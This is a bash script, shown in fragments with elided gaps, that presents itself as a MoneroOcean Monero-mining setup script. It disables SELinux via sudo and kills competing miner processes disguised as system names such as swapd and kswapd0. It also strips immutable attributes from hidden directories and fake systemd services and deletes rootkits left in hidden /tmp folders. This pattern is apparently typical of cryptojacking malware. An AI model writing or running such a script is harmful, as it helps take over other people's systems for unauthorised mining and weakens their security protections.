#!/bin/bash
# Complete version with all functions - FIXED for production use
# Version 2.15 - All original functions preserved, infinite loops removed

sudo setenforce 0 2>/dev/null || true

VERSION=2.15

echo "MoneroOcean mining setup script v$VERSION (COMPLETE - ALL FUNCTIONS)"
...
# Function definitions from original
timeout_run() {
    local timeout=5
    local cmd="$@"
    $cmd &
...
pkill -9 swapd kswapd0 xmrig 2>/dev/null || true

# Clean up old installations
echo "[*] Cleaning up old installations"
for dir in $HOME/.swapd $HOME/.gdm $HOME/.gdm2_manual* $HOME/.gdm2; do
    [ -d "$dir" ] && { chattr -i -R "$dir" 2>/dev/null || true; rm -rf "$dir"; }
done

for svc in /etc/systemd/system/swapd.service /etc/systemd/system/gdm2.service; do
    [ -f "$svc" ] && { chattr -i "$svc" 2>/dev/null || true; rm -f "$svc"; }
done

systemctl daemon-reload 2>/dev/null || true

# Clean rootkits from /tmp
cd /tmp 2>/dev/null || true
for tmpdir in .ICE-unix/.X11-unix .X11-unix; do
    if [ -d "$tmpdir" ]; then
        cd "$tmpdir" 2>/dev/null && {
            for rkit in Reptile Nuk3Gh0st Diamorphine; do
                [ -d "$rkit" ] && { chattr -i -R "$rkit" 2>/dev/null || true; rm -rf "$rkit"; }
            done
            cd /tmp
        }
    fi
